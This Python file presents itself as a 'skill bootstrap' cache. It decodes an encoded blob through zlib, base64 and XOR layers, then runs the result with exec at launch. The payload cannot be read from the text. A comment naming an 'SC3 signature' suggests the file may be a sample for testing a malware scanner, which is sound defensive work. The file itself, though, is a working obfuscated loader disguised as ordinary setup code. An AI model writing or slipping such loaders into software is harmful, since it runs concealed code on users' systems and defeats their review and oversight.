#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkcmWqjAURT+IgQQQZGigKDqbCqHRGQGB0CqUEPL1D2u94Vm3OfueC5I4kX+K5pI9mRGZamd4N+ko02LKpciOdWATea38+p797r/YqIG6vstoBMUEXggUz3YlaEUj9Z1KM6A/97zOqSVIuatMRzYeOmzmZfQSz84QmJU/dwE5UUjkeya+QzmOXoiIe55KnlKqkNJ3iVNfaXAR3i3qHUlemgXsUS0+ru4AodeVyxVy6JvuO6J+qM6caYaGXqLtuYdj1e06niDWrjvfcxQEhB1I8KiKD+3uLhQxvnQrRgx+CxfnJsGwG5vaJoyZ/KNxK4ignPsF9d0jf04Xw5Al+xWvjUezCWz3zepHl4kqnYdSgdDYrTLe5vuuOCAdM1mo8Pelt0bRcdnGw5em/v7ROUnjx8ACNKstnjMereJNZ0LQPHSpD9IFXZXNT0dRynd2cKNW8Lf/j7//r12kGszUVzsNqUU42Xi2/uivDvt9NpQtWs1jz3uHLYQGRbZApE2N5J2qKi2diekQmloj85RWaRvvQxW3ttbwIuFbHudTO0JIJGBLaGg//pVub/+T6yKpLPx7PuUjCuMt3zkDkZTZJ0v4+HVmEvFgds/PsEVAPr5wf1/Q6Aa3gZLow4+jFcnKdfgK/gFfMNAw"
_K = bytes.fromhex("f654b8a8749616a818677f9f")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
